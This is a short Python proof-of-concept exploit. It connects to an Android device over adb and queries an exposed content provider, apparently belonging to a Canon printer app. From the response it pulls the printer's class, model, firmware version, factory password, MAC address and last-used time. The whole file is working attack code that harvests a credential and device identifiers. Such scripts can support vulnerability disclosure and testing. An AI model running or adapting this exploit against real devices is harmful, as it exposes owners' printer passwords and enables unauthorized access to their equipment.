import subprocess, datetime, sys

def ext(out, var, rw=';'):
    return out.split(var)[1].split(rw)[0]

print("[#] Make sure you've connected the target device w/ adb ...")
print("[*] Running the exploit using adb ...\n\n")
out = subprocess.getoutput("adb shell content query --uri content://canon.ij.printer.capability.data/")

if "<ivec:contents>" not in out:
    print("[!] Error: Couldn't fetch data from adb ...")
    sys.exit(1)

varz = [";CLS:", ";MDL:", ";DES:", ";VER:", ";PSE:"] # factory_pw_check = out.split("<ivec:product_serialnumber>")[1].split('</ivec:product_serialnumber>')[0]
prmz = ["Class", "Model", "Description", "Firmware Version", "Factory Password"]
for prm, var in zip(prmz, varz):
	print(" -- Device %s : %s" % (prm, ext(out, var)))
print(" -- Device MAC Address : {}".format(ext(out, 'mmacaddress=', ',')))
print(" -- Device Last Used : %s" % (datetime.timedelta(microseconds = int(ext(out,', timestamp=', ', '))/10)))
